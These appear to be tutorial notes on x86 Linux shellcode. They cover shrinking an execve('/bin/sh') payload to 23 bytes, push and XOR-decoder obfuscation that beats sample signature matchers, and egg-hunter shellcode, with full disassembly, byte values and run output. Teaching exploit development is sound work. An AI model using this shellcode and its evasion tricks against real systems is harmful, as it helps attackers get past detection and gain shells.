# Unit 4: Shell Code Variations

## Reducing the Size of Shell Code

- See `long_shell.asm`, the shell code we used earlier.
- Let's calculate the size this shellcode by using:

```sh
$ printf `hexconvert bin/longshell` | wc -c
38
```

- The smaller the shell code the better we can use it.

## Using the Stack More Effectively

- If you have a look at `objdump` of the previous shell:

```asm
08049018 <callback>:
 8049018:       e8 e5 ff ff ff          call   8049002 <shell>
 804901d:       2f                      das
 804901e:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
 8049021:       2f                      das
 8049022:       73 68                   jae    804908c <callback+0x74>
```

- You can notice that `call` instruction takes far to many bytes, it takes 5 bytes!
- Let's try to reduce the size of our shell code.

### Attempt #1

- Let's try to remove jmp-callback labels and push `"/bin/sh"` by ourselves.
- Have a look at `push_shellv1.asm`, then look at `objdump` of it:

```asm
Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       50                      push   eax
 8049003:       6a 68                   push   0x68
 8049005:       6a 73                   push   0x73
 8049007:       6a 2f                   push   0x2f
 8049009:       6a 6e                   push   0x6e
 804900b:       6a 69                   push   0x69
 804900d:       6a 62                   push   0x62
 804900f:       6a 2f                   push   0x2f
 8049011:       89 e6                   mov    esi,esp
 8049013:       31 d2                   xor    edx,edx
 8049015:       52                      push   edx
 8049016:       56                      push   esi
 8049017:       89 e1                   mov    ecx,esp
 8049019:       89 f3                   mov    ebx,esi
 804901b:       b0 0b                   mov    al,0xb
 804901d:       cd 80                   int    0x80
 804901f:       31 db                   xor    ebx,ebx
 8049021:       31 c0                   xor    eax,eax
 8049023:       40                      inc    eax
 8049024:       cd 80                   int    0x80
```

- Each push takes up 2 bytes, because we have 7 `push` instructions, that's 14 bytes.
- If you compare it to the previous `objdump` you see that jmp-callback takes exactly 14 bytes.
- So we changed nothing at all, making no size difference.
- Let's test if this shell code even works:

```sh
$ ./bin/push_shellv1
$
```

- It doesn't even work!
- Let's fire up gdb and figure out why it doesn't work:

```sh
(gdb) ds
Dump of assembler code for function _start:
   0x08049000 <+0>:     xor    eax,eax
   0x08049002 <+2>:     push   eax
   0x08049003 <+3>:     push   0x68
=> 0x08049005 <+5>:     push   0x73
   0x08049007 <+7>:     push   0x2f
   0x08049009 <+9>:     push   0x6e
   0x0804900b <+11>:    push   0x69
   0x0804900d <+13>:    push   0x62
   0x0804900f <+15>:    push   0x2f
   0x08049011 <+17>:    mov    esi,esp
   0x08049013 <+19>:    xor    edx,edx
   0x08049015 <+21>:    push   edx
   0x08049016 <+22>:    push   esi
   0x08049017 <+23>:    mov    ecx,esp
   0x08049019 <+25>:    mov    ebx,esi
   0x0804901b <+27>:    mov    al,0xb
   0x0804901d <+29>:    int    0x80
   0x0804901f <+31>:    xor    ebx,ebx
   0x08049021 <+33>:    xor    eax,eax
   0x08049023 <+35>:    inc    eax
   0x08049024 <+36>:    int    0x80
End of assembler dump.
(gdb) x/3x $esp
0xffffd098:     0x00000068      0x00000000      0x00000001
```

- The stack contains a 4 byte value (because of stack alignment) of `0x68` as `0x00000068`.
- That just means that we can't just push single byte values, because that would fuck up stack alignment.
- That's why it doesn't work as intended.

### Attempt #2

- Now because stack alignment says 4 bytes must be pushed to and popped from the stack, let's try to push `"/bin/sh"` right on the stack with two `push` instructions.
- Because `/bin/sh` is 7 bytes long, we will have to use extra `/` which have no effect on the final path (`//bin/sh` is the same as `/bin/sh`).

```asm
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 
```


- Let's compile and try running our shell code:

```sh
$ nasm -f elf32 push_shellv2.asm -o bin/push_shellv2.o
$ ld -m elf_i386 bin/push_shellv2.o -o bin/push_shellv2
$ ./bin/push_shellv2
sh-5.2$ cal
   September 2024
Su Mo Tu We Th Fr Sa
 1  2  3  4  5  6  7
 8  9 10 11 12 13 14
15 16 17 18 19 20 21
22 23 24 25 26 27 28
29 30
```

- Beautiful, this works! But how much bytes have we reduced?
- Well not much, but 2 bytes are way to go

```sh
$ printf `hexconvert ./bin/push_shellv2` | wc -c
36
```

## Removing Crud from the Shell Code

- Next thing to remove is `exit` syscall.
- Reason why you can remove `exit` syscall is that it doesn't have any effect if `execve` syscall is successfully executed.
- The only thing `exit` does is prevent our program from segfaulting when it doesn't execute `execve` syscall.
- Next thing to consider is that, to spawn a shell using `execve` you don't need as much as we have been supplying:

```c
#include <unistd.h>

int main(){
  execve("/bin/sh",NULL,NULL);
}
```

- This too can spawn a shell without any problems.
- Testing `reduced_shell.asm` shell code and it works just fine, in just 25 bytes of size!

```sh
$ printf `hexconvert ./bin/reduced_shell` | wc -c
25
```


### Zeroing out better

- Last thing to do is to zero out registers using `mul` instruction.
- With this we can save additional two bytes, because with one instruction we can zero out two registers.
- Have a look at `reduced_shellv2.asm` and you will see these two instructions:

```asm
    xor ecx,ecx
    mul ecx
```

- This will essentially zero out ecx, and have EAX multiplied by ECX (which is 0) and thus the result will be stored in EAX and EDX (which is also 0).
- And finally, we saved two more bytes:

```sh
$ printf `hexconvert bin/reduced_shellv2` | wc -c
23
```


## Shell Code Hiding

### Signature Matching Defenses

- `sig_matcher.c` is basic example of signature matching detection.

```sh
$ ./bin/sigmatch $(printf `hexconvert bin/longshell`)
Nope!
```

- Signature matching is detecting specific input that is contained within the executable that matches that of a shell code.
- It's a common way for defending against exploits.
- Look at the more advanced version of signature matching `sig_matcher_advanced.c`.
- This program will match any executable which has shell code indicative instructions like `mov al, 0xb` and `int 0x80`.
- How do you defeat this mechanism?

### Obfuscating Shell Code

- Signature matching detection can be __easily defeated with obfuscated or polymorphic shell code__.
- These shell codes somehow dynamically change their code to evade signature matching.

### Simple Push Based Obfuscation

- Idea is to rewrite `reduced_shellv2.asm` with just `push` instructions and one `call esp`.

```asm
08049000 <_start>:
 8049000:       31 c9                   xor    ecx,ecx
 8049002:       f7 e1                   mul    ecx
 8049004:       50                      push   eax
 8049005:       68 6e 2f 73 68          push   0x68732f6e
 804900a:       68 2f 2f 62 69          push   0x69622f2f
 804900f:       89 e3                   mov    ebx,esp
 8049011:       b0 0b                   mov    al,0xb
 8049013:       cd 80                   int    0x80
```

- Here are the bytes in LE order:

```sh
0xe1f7c931
0x2f6e6850
0x2f686873
0x8969622f
0xcd0bb0e3
0x90909080
```

- But we need a reverse order of these bytes to:

```sh
0x90909080
0xcd0bb0e3
0x8969622f
0x2f686873
0x2f6e6850
0xe1f7c931
```

- The effect we are trying to create is to split instructions like `0xcd 0x80` into multiple lines.
- This will evade signature detection mechanism in `sigmatchv2`, but will fail in `sigmatch` because of `"sh"` string

```sh
$ ./bin/sigmatchv2 $(printf `hexconvert ./bin/obfuscatedv1`)
Segmentation fault (core dumped)
$ ./bin/sigmatch $(printf `hexconvert ./bin/obfuscatedv1`)
Nope!
```

### Decoder Obfuscated Shell Code

```sh
$ printf $(hexconverter bin/reduced_shellv2) | ./le-fourbytes.py - 0xFF | tac
0x6f6f6f7f
0x32f44f1c
0x76969dd0
0xd097978c
0xd09197af
0x1e0836ce
```

- What this script does is that it gets byte code from our shellcode and XORs them with `0xFF`, then it just reverses the order with `tac` command.
- This way it passes both of our sig matching programs (ignore the segfault):

```sh
$ ./bin/sigmatch $(printf `../unit_03_shell/hexconverter bin/obfuscatedv2`)
Segmentation fault (core dumped)
$ ./bin/sigmatchv2 $(printf `../unit_03_shell/hexconverter bin/obfuscatedv2`)
Segmentation fault (core dumped)
```

- Someone on the other side could write a signature to detect our decoder.
- But we could've obfuscated our decoder too, and then that guy would need to write a signature for that obfuscation.
- And this could go on and on in a loop, but one is certain __signature matching detection always fails in the end!__


## Egg-Hunt Shell Code

- What if instead of the buffer you load your shellcode somewhere into the address space of your target program and have it executed by some other piece of code.
- That's whats called __egg-hunt__ shell code, where your shell code will plant an egg in memory and another program will search through memory for it and when it finds your shellcode it will just pass control to it.
- You would use this technique if regular shell code isn't good enough to defeat good signature matching schemes or the buffer is to small.

### Good Egg

1. NOP (`0x90`) instructions
2. Is duplicated at the beginning of the shellcode

- Typical egg used would be `0x50905090`.
    - The reason for that is that `0x90` and `0x50` don't affect our shellcode.
- This egg would be defined at the beginning of the shell code and would be duplicated.
- The reason for duplication is that the egg hunter program doesn't identify false location of the shellcode.
- See `egg_shellv1.asm`.

### Hunt the egg

- We need to hunt this egg, that means we need to:

1. Iterate through virtual address space from `0x00000000` to `0xFFFFFFFF`
2. Access all those addresses without causing a segmentation fault

- Each memory region is comprised of memory pages which are `1024B` big.
- That only means that if memory address is not referenced you will pass on to the next memory page.
- For accessing the addresses we will use __access__ syscall, which will return `EFAULT` if memory address is not accessible.
- See `huntv1.c`.
- Now you could execute something like this: `$ ./bin/huntv1 $(printf $(../unit_03_shell/hexconverter ./bin/egg_shellv1))`
